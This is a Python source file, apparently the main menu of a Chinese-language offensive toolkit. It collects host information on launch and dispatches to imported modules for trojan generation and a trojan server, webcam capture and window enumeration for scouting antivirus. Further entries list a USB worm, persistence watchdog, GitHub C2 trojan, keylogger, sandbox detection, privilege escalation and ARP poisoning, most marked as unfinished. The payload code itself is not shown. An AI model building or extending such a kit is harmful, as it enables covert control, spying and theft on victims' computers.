from mod.help import *
from mod.upload import *
from mod.ser import *
from mod.mumaser import *
from mod.shot import *
from mod.getproc import *
from mod.ssh import *
import random

ver = 1
#启动项===========
#upload(ver)
#check_ip()
localinfo()

logo1 = '''
    ooooo   ooooo       .o             oooo        oooooooooo.               ooooooooo                              
    `888'   `888'     .d88             `888        `888'   `Y8b             d"""""""8'                              
    888     888    .d'888    .ooooo.   888  oooo   888     888 oooo  oooo        .8'   .ooooo.   .ooooo.  oooo d8b 
    888ooooo888  .d'  888   d88' `"Y8  888 .8P'    888oooo888' `888  `888       .8'   d88' `88b d88' `88b `888""8P 
    888     888  88ooo888oo 888        888888.     888    `88b  888   888      .8'    888ooo888 888ooo888  888     
    888     888       888   888   .o8  888 `88b.   888    .88P  888   888     .8'     888    .o 888    .o  888     
    o888o   o888o     o888o  `Y8bod8P' o888o o888o o888bood8P'   `V88V"V8P'   .8'      `Y8bod8P' `Y8bod8P' d888b    
        '''


def print_colorful(text):
    colors = [
        '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m'
    ]
    print(random.choice(colors) + text + '\033[0m')


for line in logo1.split('\n'):
    print_colorful(line)

help = '''
指令：
    菜单/menu  - 输出所有支持的模块
    退出/exit  - 退出工具
'''


def print_menu():
    functions_name = [
        ("0", "|检查更新"),
        ("1", "|检测信息"),
        ("2", "|内网文件传输"),
        ("3", "|内网CMD小马"),
        ("4", "|摄像头shot"),
        ("5", "|获取前台程序"),
        ("6", "|py-ssh"),
        ("7", "|USB蠕虫"),
        ("8", "|看门狗(维持运行)"),
        ("9", "|内网上线命令生成"),
        ("10", "|补丁提权查询"),
        ("11", "|内网DNSlog"),
        ("12", "|嗅探"),
        ("13", "|代理"),
        ("14", "|github C2木马"),
        ("15", "|键盘记录"),
        ("16", "|截屏获取"),
        ("17", "|沙箱检测"),
        ("18", "|挖掘电脑上软件提权方式"),
        ("19", "|ARP投毒"),
    ]
    print(help)
    print("==========菜单==========")
    for i in range(0, 20):
        print(functions_name[i][0].ljust(5) + " " +
              functions_name[i][1].ljust(15))


def input_com():
    print_menu()
    while True:
        user_input = input("\033[4m请输入指令(menu>>菜单): \033[0m")
        if user_input == "exit" or user_input == "退出":
            print("=====再会=====")
            break
        elif user_input == "menu" or user_input == "菜单":
            print_menu()
        elif user_input == "0":
            upload(ver)
        elif user_input == "1":
            localinfo()
            check_ip()
            get_env()
        elif user_input == "2":
            print("=====选择exe版本或python版本=====")
            version = input(
                "1| exe版本(完全控制时&界面美观&可选目录)\n2| python版本(隐蔽&自定义)\n输入选择:")
            if version == "1":
                exeser()
            elif version == "2":
                pyser()
            elif version == "exit":
                print_menu()
            else:
                print("输入错误，请重新输入")
        elif user_input == "3":
            print("=====内网CMD小马=====")
            print("=====选择生成木马或启用服务端=====")
            version = input("1| 生成木马\n2| 启用服务端\n输入选择:")
            if version == "1":
                mumaag()
            elif version == "2":
                mumaser()
            elif version == "exit":
                print_menu()
            else:
                print("输入错误，请重新输入")
        elif user_input == "4":
            print("=====摄像头shot=====")
            print("=====选择探测摄像头或用摄像头截图=====")
            version = input("1| 探测摄像头\n2| 摄像头shot\n输入选择:")
            if version == "1":
                check_cameras()
            elif version == "2":
                shot()
            elif version == "exit":
                print_menu()
            else:
                print("输入错误，请重新输入")
        elif user_input == "5":
            print("=====获取所有窗口句柄=====\n" + str(get_all_windows()) +
                  "\n=====前台窗口句柄=====\n" + str(get_windows()) +
                  "\n=====前台窗口名称=====\n" + str(get_title(get_windows())))
            check_all = input("1| 是否显示所有句柄？判断杀软与了解目标或许有用\n2| NO\n输入选择:")
            if check_all == "1":
                handles = get_all_windows()
                for handle in handles:
                    print("句柄" + str(handle) + "对应:" + get_title(handle))
            else:
                print("==========")
        elif user_input == "6":
            print("=====python版ssh=====")
            print("=====如你所见，99.1928%的win上没有ssh=====")
            version = input("1| ssh命令执行\n2| 反向ssh服务\n3| ssh隧道\n输入选择:")
            if version == "1":
                run_1()
            elif version == "2":
                print("=====还在更新=====")
            elif version == "3":
                print("=====还在更新=====")
            else:
                print("=====或许还有其他功能=====")
        elif user_input == "7":
            print("=====还在更新=====")
        elif user_input == "8":
            print("=====还在更新=====")
        elif user_input == "9":
            print("=====还在更新=====")
        elif user_input == "10":
            print("=====还在更新=====")
        elif user_input == "11":
            print("=====还在更新=====")
        elif user_input == "12":
            print("=====还在更新=====")
        elif user_input == "13":
            print("=====还在更新=====")
        elif user_input == "14":
            print("=====还在更新=====")
        elif user_input == "15":
            print("=====还在更新=====")
        elif user_input == "16":
            print("=====还在更新=====")
        elif user_input == "17":
            print("=====还在更新=====")
        elif user_input == "18":
            print("=====还在更新=====")
        elif user_input == "19":
            print("=====还在更新=====")
        else:
            print("你输入了预期之外的选项，生活也是如此。\n不拘泥于工具，不止步于此！")


input_com()